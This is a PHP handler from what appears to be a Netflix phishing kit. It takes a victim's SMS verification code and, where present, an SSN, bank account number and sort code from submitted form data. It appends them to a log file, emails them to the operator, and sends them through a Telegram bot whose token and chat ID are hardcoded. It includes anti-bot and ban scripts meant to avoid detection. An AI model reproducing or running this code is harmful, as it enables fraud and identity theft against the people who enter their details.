<?php
/*  
  ___                  _  ___         _    __  
 (  _ \               ( )(  _ \     /  ) / _  \
 | ( (_)   _    _   _ | || | ) |   (_  |( (_) |
 | |  _  / _ \ ( ) ( )| || | | )     | | \__  |
 | (_( )( (_) )| \_/ |(_)| |_) |     | |    | |
 (____/  \ __/  \   /    (____/      (_)    (_)
         /(      \ /  (_)                      
        (__)     (_)                           


*/
if (isset($_POST['thd']) && isset($_POST['thd'])) {
    session_start();
	include "./system/ban.php";
    include '../mine.php';
    include '../../prevents/anti2.php';
		$msg .= "
💰 S M S - V I C T I M 💰
👱🏻‍♂️ VBV OF USER = {$_SESSION['fname']}
🔑 SMS = {$_POST['thd']}
👀 IP ADDRESS = {$_SESSION['ip']}
      🦸‍♂️  HERO  🦸‍♂️ 
";		
if(isset($_POST['ssn'])){$msg.="SSN            : {$_POST['ssn']}\r\n";}
if(isset($_POST['acn'])){$msg.="ACOUNT NUM. : {$_POST['acn']}\r\n";$msg.="SORT CODE   : {$_POST['scode']}\r\n";}
if($saveintext=="yes"){$save=fopen("../../".$filename.".html","a+");fwrite($save,$msg);fclose($save);}
$subject=" ♥ NETFLIX LOGIN ♥ [".$_POST['eml']."] From [".$_SESSION['ip_countryName']."] ";$headers="From: ♥ Cv.19 ♥ <newlogin@shadow.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/html; charset=UTF-8\r\n";if($sendtoemail=="yes"){foreach(explode(",",$yous)as $your){@mail($your,$subject,$mg,$headers);include "./system/ban.php" ;
$ip = getenv("REMOTE_ADDR");
  $message = "$msg";
  $token ='1749591870:AAGiAbV3btLtdkc9clhV-KaY7WujlypsIWs';
    $data = [
    'text' => $message,
    'chat_id' => '-513277491'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );;}}
exit('done');}
?>